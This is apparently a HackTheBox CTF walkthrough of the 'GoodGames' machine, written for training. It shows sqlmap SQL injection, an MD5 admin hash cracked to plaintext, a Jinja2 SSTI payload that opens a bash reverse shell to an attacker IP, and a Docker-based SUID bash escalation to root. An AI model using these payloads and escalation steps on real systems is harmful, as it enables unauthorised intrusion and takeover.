<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">GoodGames HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/goodgames-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-12-20T09:43:45+00:00">December 20, 2022</time><time class="updated" datetime="2025-06-19T19:56:23+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">GoodGames is a Linux machine and is considered an easy box. but it was tricky indeed. On this box, we will begin with a basic port scan and move laterally. Then we will enumerate domain name and subdomains. Then we will exploit SQL Injection vulnerability using burp and SQLmap. Exploitation of the server-side template injection (SSTI) will give us an initial foothold into the target machine. Then we will be tasked to gain root access where we will exploit it by taking advantage of the special permissions and ownerships both in the server and the Docker. A successful binary abuse will give us a root shell of the target system.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
<ul>
<li><span style="color: #000000;">TCP Port Scan</span></li>
<li><span style="color: #000000;">Initial Enumeration</span></li>
<li><span style="color: #000000;">Web Page Enumeration</span></li>
<li><span style="color: #000000;">SQL Injection Exploitation with sqlmap</span></li>
<li><span style="color: #000000;">Admin Console Enumeration</span></li>
<li><span style="color: #000000;">Internal Sub Domain Enumeration</span></li>
<li><span style="color: #000000;">Server-Side Template Injection (SSTI) Exploitation</span></li>
<li><span style="color: #000000;">User Flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Docker Enumeration</span></li>
<li><span style="color: #000000;">SUID Permission abuse</span></li>
<li><span style="color: #000000;">Root Flag</span></li>
</ul>
<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
<h3><span style="color: #800000;">Initial Access</span></h3>
<p><span style="color: #000000;">We are going to start assessment with the normal TCP/IP port scanning.</span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>TCP Port Scan</strong></span></span></h4>
<p><span style="color: #000000;">Let’s start with the port scan. We are using nmap to find out which ports are open and what services are running in the target host. Nmap is a popular port scanning tool come with Kali Linux. In order to perform port scan, we have used –<strong>sV</strong> and <strong>-sC</strong> flags which performs a service version scan with NSE scripts against the target machine.</span></p>
<p><span style="color: #000000;">Flags features:</span></p>
<p><span style="color: #000000;"><strong>-sV</strong>:  Attempts to determine the service version</span></p>
<p><span style="color: #000000;"><strong>-sC</strong>:  Scans with default NSE scripts</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.129.33.160</pre>
<p><span style="color: #000000;">From the nmap scan, we have found there was only one port open, which is port <strong>80</strong>. As usual <strong>HTTP service</strong> is running on its default port and the HTTP service is used for the webhosting. Let’s take some notes about our findings.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiO-B64vfMAIyV9rs-C-O6tVoSdRlCVPRvdAIVTaS3a0uXXqwl6DFXXaycI-fy5dhcZuUcEFUcbjL9ZwYzXKdl_vJrtJzvJU-i7x_cTaDA-OMMCop3Ejn-cjbYUikfZSA4xAXN3gMZtB16xowDOhy_ItF6tN7Q6F3jRuaTOKVzIMlg6NTGOip8He4aR6A/s16000/1.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Initial Enumeration</strong></span></span></h4>
<p><span style="color: #000000;">As we have only one port is open, we begin with port 80 enumerating by accessing it over the browser and found the web page. From the webpage interface, it looks like a video game online store. If we see our nmap result, we gathered earlier showing the http title as Goodgame community and store that makes sense.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3tk8AQUgjPLBloIyZfIYxFbeKEB0cQi8RcqxgYvo7jcSCCMboSLSZkwzHrbggDf9JxXrqMUkGaKqlKeEf_XsuOWxF1jBXCrEEPIu9qmNEGrR6Bmi4pIT3YHEPqAxGfPMBihZFg122Iv4e1jDbucMY-GKRzIcgTdJ-5PnlD7uySwSS1DRLrk2M5cZzzw/s16000/2.png"/></strong></span></p>
<h4><span style="color: #000000;"><strong><span style="text-decoration: underline;">Web Page Enumeration</span> </strong></span></h4>
<p><span style="color: #000000;">While enumerating webpage we found a login page. From the login in page, we can enumerate further by registering ourselves as a new member or if we have valid credentials, we can directly log in to do the same.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi42DeSWIsnJLLk8p1jsI-d9uqrx1O2WeJMJJzgFlm9pmZT7gsAKS6zUG_gDTmKs-tnvYrRZL98eJ9lJM9liGznUapp7hkZ5Tyy5EshqwIz1CxLzN2PUB1EPNgwji5H3YeGPowVf9-uGJ4xP_6H2YSZx57FDLdllnq7eOq85A3DHjG7gqrWRX09S1_cQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Before registering a new user account let’s capture the login request on the burp. Here we are using a random email and password. You can use any random credentials to capture request for testing purpose.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEijaKZJG5g9iefocLWc8Hkc2Vz3fl4U6aDsLJOK-YYOUjM1kCrBkKk5WlG-9Vgysyjib8iNP5JpX-_yafrUcYz_V7b8dXjaTHO4wJ8Sp2xzlWIqx10a059pVrDKny5XZQmLPZzDrXKS_qZo1Zia_ZO7bSHmUL2A0bZwtGLOsBLsPj73Fy7dZOqSBjTeJA/s16000/4.png"/></span></p>
<p><span style="color: #000000;">We are capturing login request on burp to check if there is any SQL injection vulnerability present in the target system. We captured the request and saved as <strong>sqlfile</strong>.  The reason we are checking SQL injection vulnerability as there is a login page and it is worth checking SQL injection in login pages and on any user input field. Most of the time, SQL injection vulnerabilities found in user input fields in the web application.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgch5WualdeC0S0xYwGLfrtlsdXbADB94nXVREwDRtL0eDi1Tzi6qx-X9m8sUqtsWEGm3mvXCW-6WLIiDRn7lwxi8cjL4n8tWENavhEp71HVaAAiGgmsV6tGzit9HtlsxErWv3c2TsRzruBKnRy9D19BMnOTHOAy_fvl7UEjBkrIJoVfMdAmjS6M77Wyw/s16000/5.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>SQL Injection Exploitation with sqlmap</strong></span></span></h4>
<p><span style="color: #000000;">Next, we are going to check the database name by loading the login request that we captured on burp. In the below picture, we have loaded <strong>sqlfile</strong> on sqlmap which will be going to find out the database name if the web application login parameter is vulnerable to SQL injection. Full functions of the flags are given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r sqlfile –dbs --batch</pre>
<p><span style="color: #000000;"><strong>–dbs</strong>: Enumerate DBMS databases</span></p>
<p><span style="color: #000000;">–<strong>-batch</strong>: Never ask for user input, use the default behaviour</span></p>
<p><span style="color: #000000;"><strong>-r</strong>: Request</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqgpjO4xXhQgO2VX_4JtZrA3pMr-zxokPH17d4gmgfV4XMW0EdinVGA7jeRf9Ah6FZEsNg3kYh3eFbCzxjN8R9E5-vZIxrNPdVh3dafIqjOGmKskDCTcIwpRcTKEOZjdeTMCe2zEgJDc-1XysUNqAhKw4y0Dlm6kWnYzdUSjvmDPWXOYXwuacRJz0BYQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Once we get the database name then we will dump all the contents that the database is containing by issuing a request file, and database name.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r sqlfile -D main –dbs --batch</pre>
<p><span style="color: #000000;"><strong>–dump-all</strong>: Dump all<strong>-D</strong>: Database name</span></p>
<p><span style="color: #000000;">–<strong>-batch</strong>: Never ask for user input, use the default behaviour</span></p>
<p><span style="color: #000000;"><strong>-r</strong>: Request</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitfYAhZTLwUpzNVprfZca0NXVzVy7VEdTkDOBoC0k9_WdsqUeC4Fs5f2leGqWyWPDtgpFFPa83vWRMui48PjXR5fGfR3Z78J_f5oiCnDfWQ5oEugv1nYmP5dnivOLtric6Y5eN_CoYyHTVMD6GYtpxrGJ2-W4oXV8iNEnK8Q-W3lu_egNGwzkvBzWJ5A/s16000/7.png"/></span></p>
<p><span style="color: #000000;">After dumping all the contents from the <strong>main</strong> database, we found the username, email and password hash. Here we are going to keep a note of dumped information.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkIHln11-frTWCTX5llD_PZ4_XZbRQMwP1SDr4kzvocpJxhtVQq-tdZYLDt157CXB67-pOcHbuLaASu9sftLPNleAasU_XV88cD1JE3ZLKsYz8pPo2wYO4NT4zkep3onx4qIS0TfpoqMTWHk3bC05__yUjQ6gt5F89DAaDX59ePP2foBVTZVNr-8SuQw/s16000/8.png"/></span></p>
<p><span style="color: #000000;">It looks like an md5 hash but what can we do with this hash? Until we have a plain text password, we cannot proceed further. So, we simply copy the full hash and pasted google gave us a plain texted password of md5hash. What else we could do if we did not get a plain texted password from google? Then we can use crackstation website to crack hash or hashcat and john tools to crack the hash offline.</span></p>
<p><span style="color: #000000;"><strong>Password</strong>: superadministrator</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHYpZ74OcMU96yYl2MqGFrZ5hJ0ebCe4j-bJ8LcqiGAvsj_OOnNuCUd61-Lnj5ElKYvARKL6BG9FRYyELOGdIEl2xN5S-fT-wf-5cDiYFKxeuydBNjFEwY5bykO6n1bVas5fxBFIaOLmyyvp3I9nBU6L2kYydPQaYzwL5DHYlU0WINn9Q_774_MNmdaQ/s16000/9.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Admin Console Enumeration</strong></span></span></h4>
<p><span style="color: #000000;">As we have admin user password in the plain texted form, we can try log in as admin user in the web console for further assessment.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhq4tNs5Je4-8x6J1BF9faXmEcIStyPbXujAVizYfidsFo_2lUWQKMWcdRjYJQYlx68Cb84Uzb9qLSQHTEv6b6JWldII-2ud1HFQ-cNVlPpS5lGjx69eGAgDlUZk1ZytHGAH2a9lJWiju7Ff0cboLIjtZubaPl3J_bTXBsvv1MWmK3DhBLp5_blFxZjHg/s16000/10.png"/></span></p>
<p><span style="color: #000000;">After logging in, we tried enumerating the administrator account but unfortunately, we did not get anything interesting there. There was same information that we already have but nothing much more.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfWPtUOspJ96OdEenLOa2jsmiO55BLsNLFWgTR0jmGYk-Y66XNhdgNPqAhrn-JrAdqcmhIsE3V56fDgCNuUjKN-k5MYev5nVGEgTAX0WCX_O95ZVxwfRmzK1BUqAfBxQxkdWMYbXjh3wCpZVsknNhxoxXlCQY9qbImrP8pkXtdeLCTE40E6CCGbcwbVQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Then we decided to check source code of the admin profile page and found a new subdomain there. It is worth checking source code as many times we may get valuable information from there such as subdomain or any secrets from the comment etc.</span></p>
<p><span style="color: #000000;"><strong>Subdomain url:  <span style="color: #0000ff;">http://internal-administration.goodgames.htb</span></strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUOxQNbLAFS6fRlnGUS3QmUtQqKi-PYDVr6GviMr7lzKxAZ6aUq3c8-psJQ4jUSncpRMk9TKnJ4gReLkV6_FAOw0bq-2BPRJG4qLTGMPQ_nAKhSyNJvtnI2ojqUO0HgGvMEpqF-bDhiRRlwoYsYfkBSu3i8pkhNX-tbmT0HDMCj2iRuMGbs0ayn_jLTg/s16000/12.png"/></strong></span></p>
<p><span style="color: #000000;">Let’s add it to the/etc/hosts file in the attacking machine.</span></p>
<p><span style="color: #000000;"><strong>Why do we need to add domain in the local hosts file?</strong></span></p>
<p><span style="color: #000000;">The /etc/hosts file contains a mapping of IP addresses to URLs. Your browser uses entries in the /etc/hosts file to override the IP-address-to-URL mapping returned by a DNS server. This is useful for testing DNS (domain name system) changes and the SSL configuration before making a website live.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBz9kda8V3aVMgQICfeANqHaR-ZHYukgs0klUAHi-r6ExSh3sto9eIWSpcNoCB9HkTmkpZPgG3ns-zxFzwGHRT8oWy25shvpFU4WIVECH0GqtPL-eJ-DP2XXi7e_HMNW758kShkYqeRTL0BUnZPpQACjIU2qwBGEkO-HIosjZFYDjgPOucZXkFdVgSoA/s16000/13.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Internal Sub Domain Enumeration</strong></span></span></h4>
<p><span style="color: #000000;">After adding an internal sub-domain to the hosts file, we accessed it over a browser where we have seen a new web page with a login page. We used the same credentials that we used earlier to Flask Volt sign-in system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg89A90Ja3vvqA--eOpv4Tjk-W4j7PzPCOjyYeb4g5mvzt01CwjBmn4PquFGB0WNIgcIH3P2UFGutMf9ETWahJw7Goay6-aXJxC-pWnq_H03fp4v1BvGcvJsKEwgy8IE_ugVamn_JtNWW0oRXfCr-sYyVdDsBMz1lXSYoFqaeYUdN_ElTpiJeciVQ1CJg/s16000/14.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Server-Side Template Injection (SSTI) Exploitation</strong></span></span></h4>
<p><span style="color: #000000;">From the information, we gathered during the nmap scan the server-side code was a python, so it is worth checking the Server-side template injection (SSTI). Here we are using a payload to detect SSTI, and the detection process is like the XXS. We have found that the user input field is vulnerable to SSTI as it is reflecting the sum of the payload provided.</span></p>
<p><span style="color: #000000;"><strong>What is SSTI vulnerability?</strong></span></p>
<p><span style="color: #000000;">A server-side template injection (SSTI) vulnerability <strong>occurs when user data is embedded directly in a template and then interpreted by the template engine</strong>. This allows attackers to inject arbitrary directives to manipulate the template engine.</span></p>
<p><span style="color: #000000;"><strong>Detection payload:</strong> {{5*5}}</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGcFuGfKzT90t1fR4Iz97bsynUBMWQ6vonVe083enKIYMou8YUh8btYfdQdQel_jki6OpnvZ35P7qiMK02X8-kzE6ai7bRNjn-FdWNMufFTvU5dsULD--2wdMM6ulqk2wCgtjuYLTxPkpij6lfw2vX_EytcP8NvZZtkY7LVsP95ju1YMSMe-j11M2jLw/s16000/15.png"/></span></p>
<p><span style="color: #000000;">Now it is confirmed that target system is vulnerable to the SSTI, now we are in the position to move forward to inject a reverse shell payload. For the reverse shell we are using a popular git repository “<strong>Payload All The Things</strong>” where you will find all the payloads you will need during your penetration testing engagement. Please note, we will need to modify payload to receive the reverse shell. For example, we need to issue our attacking machine IP address (10.10.14.93) and port number (1234) where we wish to listen.</span></p>
<p><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-subprocesspopen">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-subprocesspopen</a></span></strong></p>
<p><span style="color: #000000;"><strong>Original payload</strong>: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">{{ namespace.__init__.__globals__.os.popen('id').read() }}</pre>
<p><span style="color: #000000;"><strong>Modified payload</strong>:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.93/1234 0&gt;&amp;1"').read() }}</pre>
<p><span style="color: #000000;">When our payload is crafted then we will inject it into the user input field which is “Full Name”  in the target web application then we will start a netcat listener in our attacking machine with the below command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiftbkU8yNmKx7mmFJRTzuWCDOptDItKUM_rQ9oA9tD_3cTFYSrnRIu6fNUzmvL3wC2wzeDdIw2Gl13LjDTeQC8wM6hVGtKjmd2qz_Zz6CceLEUnqSsJrcngJpXbe5i4TXw14MsDKNMsHUK_Io-L-9Ri7H3OCLbFDtSxaD5Fgra-p-2aOqwzMTBkR7TvA/s16000/18.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>User flag</strong></span></span></h4>
<p><span style="color: #000000;">Next, we will execute it by clicking on <strong>Save all</strong> tab which will execute our malicious payload in the target system and send a remote connection back to our netcat listener. In the below screenshot, we can see that we have successfully received a reverse connection as user<strong> root</strong>. But there is a trick, it is not the real root shell which we will discuss later. Once, we get reverse connection then we can grab user flag from the /home/augustus directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZ5IN93qxzXm1M7tfbG9tyYJ5uf66mt4HpCsJov0y3bP7s5rOSbBEP8-aF1D02jzdxS1bC9hI1JjOX5cUTH-v-4UqeAiE5ByzBBRwh5rbqc46b4SJLG0RJeYHXyoPj2i0uAwEVyf8SNcQ3GY7byFbHa6adODJksHPg1AIIv3Qd5fuY2rp1dZ2oVXEEPg/s16000/19.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Docker Enumeration</strong></span></span></h4>
<p><span style="color: #000000;">While enumerating for the privilege escalation vectors, we found a Docker file present in the root backend directory (/backend) which give an insight that the server is using a docker container in it. Let’s talk docker role in the box or in any server. Please note, that we are in the docker container not in the real server.</span></p>
<p><span style="color: #000000;">We checked the network interface and found it is connected to the internal network adaptor on <strong>172.19.0.2/16</strong> subnet which means we cannot communicate with the internal network directly from our kali system, but the compromised host can communicate with the internal network. </span></p>
<p><span style="color: #000000;">In this scenario, we can use port forwarding or pivoting technique to communicate directly from our kali system but before jumping into that we also need to verify which hosts are up in the internal network. To find out the available host in the internal network we are going to use nmap static binary which means a portable nmap binary that we can use from the compromised hosts system against the internal network. We can download the nmap static binary from the below link by providing the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap</pre>
<h5><span style="color: #000000;"><strong>Reference</strong>:<span style="color: #0000ff;"><strong> <a style="color: #0000ff;" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap</a></strong></span></span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNh-FhnjiGQwaqiMqeDeSKQkkKysJcwsBv_J2tm63oPWHTMFqVUr3hUVvHXxkHRt6SLcPopkM_jG2Skpcz0dvuRpblTV2aSPJpMIyFHyIiz914lyklypgFC334SmRL9LAVlbXHc_l3Vh_-_kdmp5o0lG8oC89ZBxpDQoKQp--RSePtZ-kXPaKMkmfzDg/s16000/21.png"/></span></p>
<p><span style="color: #000000;">Then we will transfer this binary to the compromised host using the python server by issuing the following command from our kali system:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m http.server 80</pre>
<p><span style="color: #000000;">Once the server is on then we can download nmap binary from kali by issuing following command from the compromised host:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 10.10.14.93/nmap</pre>
<p><span style="color: #000000;"><strong>Please note</strong> we have used the kali IP address as we are transferring binary from there.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg62vKerskEd7eb1D-Oj39UbrdqpZtKxGlzh_T41AcdcI5nTZCgnVHFCbXaw0-lia6kfI4wb3IkPq4zkk2ArLzgUiPfNW6X5GMxP_AfIruRNX1rkBGdtTWqXFT9F23GQ7Ic22D5zd4N0-EaOWvJoNqsG26EUJQrKdCTS500zbXzmHeaTpRgUdKDx4kjQw/s16000/22.png"/></strong></span></p>
<p><span style="color: #000000;">Next, we will give full permission to the binary so we can execute it against the internal network in order to find live hosts. For more information about Linux file permissions.</span></p>
<p><span style="color: #000000;">Here we have provided <strong>-sn flag</strong> which will only show number of available hosts in the subnet and their IP addresses. From the nmap scan result, we found that 172.19.0.1 is up.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihIG1ZIzhO6dLFrlKIdy4vsq_NDdDskgFZ0Ywp26ZpbRDbf6UDTJmuIwftH9b-peZB1SDPSdMlHW_b95MLnzjTVc4L8PfohR3A9gvID6QjTOQOlYRu3MPWvWRplBqvncrPlb_hSrhzErSKoeay3ZCy9FQmHlL5ykW7IgfoY_JRIl_SQQNphFuUsnMAOg/s16000/23.png"/></span></p>
<p><span style="color: #000000;">Once we found the potential target host from the internal network. We decided to enumerate further against it. Next, we will run another nmap scan against the potential target host (172.19.0.1) verbosely with <strong>-v </strong>flag to get more information about the target system. Here is the command to reproduce the prove of concept (POC).</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./nmap 172.19.0.1 -v</pre>
<p><span style="color: #000000;">From the nmap scan, we found that 2 ports are open where 22 port is running SSH service and port 80 is running HTTP service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpfRrO1uMObPBO3rrQ-aDh92WR51HE00HGK7YyXun6JO8X27MpriZpXIaN6Sxa70cbYe9lwYEoE1UxJauHo7oqn7njlxmVDQzW3u1lI349Fj4xvV53pywoRnoTmJtrAOyclmFVxhnl_UHfTRJZ0mn0iW8ZeyYdhHZvxr-W0OEZE8TX50AkcDTeqXeugA/s16000/24.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>SetUID Permission Abuse</strong></span></span></h4>
<p><span style="color: #000000;">Now we are trying to log in to the server as augustus from the docker container using the same password we cracked from the md5 hash earlier. Then we copied /bin/bash binary to augustus home directory which will be available in the docker as well. Next, we will exit the shell and go back to the docker root shell where we have the privilege to set <strong>SUID </strong>to bash binary as root. There we will change the ownership of the bash binary where we have given root user ownership. Next, we will change the permission and give augustus full permission on bash binary.</span></p>
<h5><strong><span style="color: #000000;">Why are we doing it and what’s the story?</span></strong></h5>
<p><span style="color: #000000;">As we know we got a root shell on docker, we cannot get root flag from the docker as it is not present there because it is just a container which is used for web hosting. And we have access to the server as user augustus who is a low-privileged user, so he has limited permissions on the server and the goal is to gain a root shell on the server.</span></p>
<p><span style="color: #000000;">Here augustus can download or copy bash binary on his home directory in the server but he cannot change ownership because of limited permission as low privileged user. On the other hand, from the root docker shell, we have root permission that can change ownership but no bash binary is present in the docker that’s why we copied the bash binary as augustus on his home directory and then switched to docker root shell so we can change ownership of the binary. Once we change ownership then it will consider that the bash binary is owned by the root and if anyone execute it then it will spawn a bash root shell which is our goal to achieve.</span></p>
<p><span style="color: #000000;">Only changing ownership will not work until we give execute permission to augustus. If he can execute it, then a root shell will be spawned so that’s why at the last step we are also issuing full permission to augustus on that binary. Steps to reproduce the POC:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh augustus@172.19.0.1</pre>
<p><span style="color: #000000;">Shell upgrade to interactive shell:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty; pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">Copy bash binary to augustus home directory:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp /bin/bash .</pre>
<p><span style="color: #000000;">Change Ownership of the binary:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chown root:root bash</pre>
<p><span style="color: #000000;">Give full permission:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 4777 bash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4i_BWSbzBQ7_p9aEmlPT7pq9Ob5016hX-lq88aGWxOdShDS_oCb2fDee_mFwl9pX54xH6YY5Qr6g6X2IQgkTn7JGW4rdBoZkrTnDQrK97SF1n3Za7HWSNWC-88E7Qab7g5n3OG1cizAXtAiflYwgUZf5y-j5zLSpgmmWorVttsYEz88FTbBMP2NVpgw/s16000/25.png"/></span></p>
<h4><span style="text-decoration: underline;"><span style="color: #000000;"><strong>Root Flag</strong></span></span></h4>
<p><span style="color: #000000;">Then we again switched to augustus shell and navigate to bash SUID set binary which is available on augustus home directory. Execution of the SUID binary spawned a bash root shell. Now we can grab our root flag from /root/root/ directory. Here are the steps to reproduce the POC.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh augustus@172.19.0.1
./bash -p
cat /root/root/root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9zDSkwl5och6yu4v_gMoX6Qi_A5p_1rUEEo_Sa7ubOZQAX51DT4JeDfP2wNXF_Ec-VEQnFn4GDC0VBGtLeNwL5aGVdUzrGs8mqhnSwiNrleHRp_sKgitkISJi2AycYNX_QrZOSTR9_e9chTnOUWAesEJhSCN0scU9FiO1Vp-jV7Jb6uk-r190PJ2puQ/s16000/26.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Conclusion</span></span></h3>
<p><span style="color: #000000;">This machine was fun and was a great source of learning, where we learned and explored so many things such as TCP port scan, service enumeration, SQL injection vulnerability Enumeration using burp suite, Exploitation of SQL injection with SQLmap, Server-Side Template Injection vulnerability enumeration and exploitation, file transfer, file permissions, about nmap static binary, internal network, Docker, Set UID permissions on docker to perform local privilege escalation.</span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> Happy Hacking!</span></p>
<p><strong>Author: </strong><span style="color: #000000;">Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact her</span>e<strong>: <a href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a> and</strong><span style="color: #000000;"> </span><strong><a href="https://twitter.com/subhashpaudel94"><span style="color: #0000ff;">Twitter</span></a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
